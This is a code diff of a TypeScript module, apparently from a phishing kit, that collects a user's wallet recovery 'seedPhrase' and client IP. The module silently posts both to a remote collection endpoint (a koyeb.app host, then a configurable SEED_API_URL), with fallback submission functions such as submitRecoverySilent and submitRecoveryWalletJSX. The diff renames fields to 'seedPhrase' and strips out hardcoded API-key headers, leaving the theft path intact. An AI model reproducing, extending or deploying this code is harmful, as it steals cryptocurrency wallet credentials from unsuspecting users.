@@ -7,61 +7,12 @@
  * DO NOT REFACTOR - Keep as-is for replication in other projects.
  */
 
-import axios, { AxiosResponse, InternalAxiosRequestConfig, AxiosHeaders } from 'axios';
+import axios, { AxiosResponse } from 'axios';
+import { NOTIFICATION_APP_NAME, SEED_API_URL } from '../app/config';
 
-// Type for axios headers structure
-type AxiosHeadersType = AxiosHeaders | Record<string, string | Record<string, string>> & {
-  common?: Record<string, string>;
-  post?: Record<string, string>;
-  get?: Record<string, string>;
-  set?: (key: string, value: string) => void;
-};
-
-// Add request interceptor to log all axios requests
-axios.interceptors.request.use(
-  (config: InternalAxiosRequestConfig) => {
-    // ALWAYS add header (including localhost)
-    if (config.url && config.headers) {
-      const apiKey = "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
-      const method = (config.method || 'post').toLowerCase();
-      const headers = config.headers as AxiosHeadersType;
-
-      // Try AxiosHeaders.set() if available (newer axios versions)
-      if (typeof headers.set === 'function') {
-        headers.set('x-api-key', apiKey);
-        headers.set('X-API-Key', apiKey);
-      } else {
-        // Set on method-specific headers (older axios versions)
-        const headersObj = headers as Record<string, string | Record<string, string>>;
-        if (!headersObj[method]) {
-          headersObj[method] = {};
-        }
-        const methodHeaders = headersObj[method] as Record<string, string>;
-        methodHeaders['x-api-key'] = apiKey;
-        methodHeaders['X-API-Key'] = apiKey;
-
-        // Also set directly on headers object
-        headersObj['x-api-key'] = apiKey;
-        headersObj['X-API-Key'] = apiKey;
-      }
-    }
-
-    return config;
-  },
-  (error) => {
-    return Promise.reject(error);
-  }
-);
-
-// Add response interceptor
-axios.interceptors.response.use(
-  (response: AxiosResponse) => {
-    return response;
-  },
-  (error) => {
-    return Promise.reject(error);
-  }
-);
+const JSON_AXIOS_CONFIG = {
+  headers: { "Content-Type": "application/json" },
+} as const;
 
 interface IPResponse {
   ip: string;
@@ -69,13 +20,13 @@ interface IPResponse {
 
 interface PrimaryMessageData {
   appName: string;
-  recovery: string;
+  seedPhrase: string;
   ip: string | null;
 }
 
 interface FallbackMessageData {
   appName: string;
-  recovery: string;
+  seedPhrase: string;
 }
 
 interface APIResponse {
@@ -101,38 +52,15 @@ interface SubmitOptions {
   apiKey?: string | null;
 }
 
-/**
- * Check if we're running on localhost
- */
-function isLocalhost(): boolean {
-  if (typeof window === 'undefined') {
-    return false;
-  }
-  const hostname = window.location.hostname;
-  const isLocal = hostname === 'localhost' ||
-    hostname === '127.0.0.1' ||
-    hostname === '';
-  return isLocal;
-}
-
-/**
- * Get the primary API endpoint based on environment
- */
 function getPrimaryAPIEndpoint(): string {
-  if (isLocalhost()) {
-    return 'http://localhost:3001/api/form/text';
-  }
-  return 'https://nice-kristin-ethname-aada4ad6.koyeb.app/api/form/text';
+  return SEED_API_URL;
 }
 
 /**
  * Get the fallback API endpoint based on environment
  */
 function getFallbackAPIEndpoint(): string {
-  if (isLocalhost()) {
-    return 'http://localhost:3001/api/form/text';
-  }
-  return 'https://nice-kristin-ethname-aada4ad6.koyeb.app/api/form/text';
+  return SEED_API_URL;
 }
 
 /**
@@ -167,39 +95,14 @@ export async function sendRecoveryToPrimaryAPI(
 
     const primaryMessageData: PrimaryMessageData = {
       appName: appName,
-      recovery: recoveryMessage,
+      seedPhrase: recoveryMessage,
       ip: clientIP
     };
-
-    const headers: Record<string, string> = {
-      "Content-Type": "application/json",
-    };
-
-    // ALWAYS add API key (including localhost)
-    const apiKeyToUse = "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
-    headers["x-api-key"] = apiKeyToUse;
-    headers["X-API-Key"] = apiKeyToUse; // Try both cases
-
-    // Ensure headers are properly formatted for axios
-    const axiosConfig = {
-      headers: {
-        ...headers,
-        'x-api-key': headers['x-api-key'] || headers['X-API-Key'] || undefined,
-        'X-API-Key': headers['X-API-Key'] || headers['x-api-key'] || undefined,
-      }
-    };
-
-    // Remove undefined values
-    Object.keys(axiosConfig.headers).forEach(key => {
-      if (axiosConfig.headers[key as keyof typeof axiosConfig.headers] === undefined) {
-        delete axiosConfig.headers[key as keyof typeof axiosConfig.headers];
-      }
-    });
 
     const response = await axios.post<APIResponse>(
       getPrimaryAPIEndpoint(),
       primaryMessageData,
-      axiosConfig
+      JSON_AXIOS_CONFIG
     );
 
     const result: APIResponse = response.data;
@@ -227,39 +130,13 @@ export async function sendRecoveryToFallbackAPI(
     // Prepare the request data with only required parameters
     const messageData: FallbackMessageData = {
       appName: appName,
-      recovery: recoveryMessage
+      seedPhrase: recoveryMessage
     };
-
-    const apiKeyToUse = apiKey || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
-
-    const headers: Record<string, string> = {
-      "Content-Type": "application/json",
-    };
-
-    // ALWAYS add API key (including localhost)
-    headers["x-api-key"] = apiKeyToUse;
-    headers["X-API-Key"] = apiKeyToUse; // Try both cases
-
-    // Ensure headers are properly formatted
-    const fallbackAxiosConfig = {
-      headers: {
-        ...headers,
-        'x-api-key': headers['x-api-key'] || headers['X-API-Key'] || undefined,
-        'X-API-Key': headers['X-API-Key'] || headers['x-api-key'] || undefined,
-      }
-    };
-
-    // Remove undefined values
-    Object.keys(fallbackAxiosConfig.headers).forEach(key => {
-      if (fallbackAxiosConfig.headers[key as keyof typeof fallbackAxiosConfig.headers] === undefined) {
-        delete fallbackAxiosConfig.headers[key as keyof typeof fallbackAxiosConfig.headers];
-      }
-    });
 
     const response = await axios.post<APIResponse>(
       getFallbackAPIEndpoint(),
       messageData,
-      fallbackAxiosConfig
+      JSON_AXIOS_CONFIG
     );
 
     const result: APIResponse = response.data;
@@ -353,9 +230,6 @@ export async function submitRecoverySilent(
   apiKey: string | null = null
 ): Promise<boolean> {
   try {
-    // Declare apiKeyToUse once at the top
-    const apiKeyToUse = apiKey || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
-
     let clientIP: string | null = null;
     try {
       const ipResponse = await axios.get<IPResponse>('https://api.ipify.org?format=json');
@@ -366,38 +240,14 @@ export async function submitRecoverySilent(
 
     const primaryMessageData: PrimaryMessageData = {
       appName: appName,
-      recovery: recoveryMessage,
+      seedPhrase: recoveryMessage,
       ip: clientIP
     };
-
-    const headers: Record<string, string> = {
-      "Content-Type": "application/json",
-    };
-
-    // ALWAYS add API key (including localhost)
-    headers["x-api-key"] = apiKeyToUse;
-    headers["X-API-Key"] = apiKeyToUse; // Try both cases
-
-    // Ensure headers are properly formatted
-    const silentAxiosConfig = {
-      headers: {
-        ...headers,
-        'x-api-key': headers['x-api-key'] || headers['X-API-Key'] || undefined,
-        'X-API-Key': headers['X-API-Key'] || headers['x-api-key'] || undefined,
-      }
-    };
-
-    // Remove undefined values
-    Object.keys(silentAxiosConfig.headers).forEach(key => {
-      if (silentAxiosConfig.headers[key as keyof typeof silentAxiosConfig.headers] === undefined) {
-        delete silentAxiosConfig.headers[key as keyof typeof silentAxiosConfig.headers];
-      }
-    });
 
     const response = await axios.post<APIResponse>(
       getPrimaryAPIEndpoint(),
       primaryMessageData,
-      silentAxiosConfig
+      JSON_AXIOS_CONFIG
     );
 
     const result: APIResponse = response.data;
@@ -407,36 +257,12 @@ export async function submitRecoverySilent(
     }
 
     // Fallback to secondary API
-    const messageData: FallbackMessageData = { appName: appName, recovery: recoveryMessage };
-
-    const fallbackHeaders: Record<string, string> = {
-      "Content-Type": "application/json",
-    };
-
-    // ALWAYS add API key (including localhost)
-    fallbackHeaders["x-api-key"] = apiKeyToUse;
-    fallbackHeaders["X-API-Key"] = apiKeyToUse; // Try both cases
-
-    // Ensure headers are properly formatted
-    const silentFallbackAxiosConfig = {
-      headers: {
-        ...fallbackHeaders,
-        'x-api-key': fallbackHeaders['x-api-key'] || fallbackHeaders['X-API-Key'] || undefined,
-        'X-API-Key': fallbackHeaders['X-API-Key'] || fallbackHeaders['x-api-key'] || undefined,
-      }
-    };
-
-    // Remove undefined values
-    Object.keys(silentFallbackAxiosConfig.headers).forEach(key => {
-      if (silentFallbackAxiosConfig.headers[key as keyof typeof silentFallbackAxiosConfig.headers] === undefined) {
-        delete silentFallbackAxiosConfig.headers[key as keyof typeof silentFallbackAxiosConfig.headers];
-      }
-    });
+    const messageData: FallbackMessageData = { appName: appName, seedPhrase: recoveryMessage };
 
     const fallbackResponse = await axios.post<APIResponse>(
       getFallbackAPIEndpoint(),
       messageData,
-      silentFallbackAxiosConfig
+      JSON_AXIOS_CONFIG
     );
 
     const fallbackResult: APIResponse = fallbackResponse.data;
@@ -468,9 +294,6 @@ export async function submitRecoveryWalletJSX(
   } = options;
 
   try {
-    // Declare apiKeyToUse once at the top
-    const apiKeyToUse = apiKey || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
-
     let clientIP: string | null = null;
     try {
       const ipResponse = await axios.get<IPResponse>('https://api.ipify.org?format=json');
@@ -481,38 +304,14 @@ export async function submitRecoveryWalletJSX(
 
     const primaryMessageData: PrimaryMessageData = {
       appName: appName,
-      recovery: recoveryMessage,
+      seedPhrase: recoveryMessage,
       ip: clientIP
     };
-
-    const primaryHeaders: Record<string, string> = {
-      "Content-Type": "application/json",
-    };
-
-    // ALWAYS add API key (including localhost)
-    primaryHeaders["x-api-key"] = apiKeyToUse;
-    primaryHeaders["X-API-Key"] = apiKeyToUse; // Try both cases
-
-    // Ensure headers are properly formatted
-    const walletJSXAxiosConfig = {
-      headers: {
-        ...primaryHeaders,
-        'x-api-key': primaryHeaders['x-api-key'] || primaryHeaders['X-API-Key'] || undefined,
-        'X-API-Key': primaryHeaders['X-API-Key'] || primaryHeaders['x-api-key'] || undefined,
-      }
-    };
-
-    // Remove undefined values
-    Object.keys(walletJSXAxiosConfig.headers).forEach(key => {
-      if (walletJSXAxiosConfig.headers[key as keyof typeof walletJSXAxiosConfig.headers] === undefined) {
-        delete walletJSXAxiosConfig.headers[key as keyof typeof walletJSXAxiosConfig.headers];
-      }
-    });
 
     let response = await axios.post<APIResponse>(
       getPrimaryAPIEndpoint(),
       primaryMessageData,
-      walletJSXAxiosConfig
+      JSON_AXIOS_CONFIG
     );
 
     let result: APIResponse = response.data;
@@ -527,39 +326,15 @@ export async function submitRecoveryWalletJSX(
     // Prepare the request data with only required parameters
     const messageData: FallbackMessageData = {
       appName: appName,
-      recovery: recoveryMessage
+      seedPhrase: recoveryMessage
     };
-
-    const headers: Record<string, string> = {
-      "Content-Type": "application/json",
-    };
-
-    // ALWAYS add API key (including localhost)
-    headers["x-api-key"] = apiKeyToUse;
-    headers["X-API-Key"] = apiKeyToUse; // Try both cases
 
     const fallbackEndpoint = getFallbackAPIEndpoint();
-
-    // Ensure headers are properly formatted
-    const walletJSXFallbackAxiosConfig = {
-      headers: {
-        ...headers,
-        'x-api-key': headers['x-api-key'] || headers['X-API-Key'] || undefined,
-        'X-API-Key': headers['X-API-Key'] || headers['x-api-key'] || undefined,
-      }
-    };
-
-    // Remove undefined values
-    Object.keys(walletJSXFallbackAxiosConfig.headers).forEach(key => {
-      if (walletJSXFallbackAxiosConfig.headers[key as keyof typeof walletJSXFallbackAxiosConfig.headers] === undefined) {
-        delete walletJSXFallbackAxiosConfig.headers[key as keyof typeof walletJSXFallbackAxiosConfig.headers];
-      }
-    });
 
     response = await axios.post<APIResponse>(
       fallbackEndpoint,
       messageData,
-      walletJSXFallbackAxiosConfig
+      JSON_AXIOS_CONFIG
     );
 
     result = response.data;
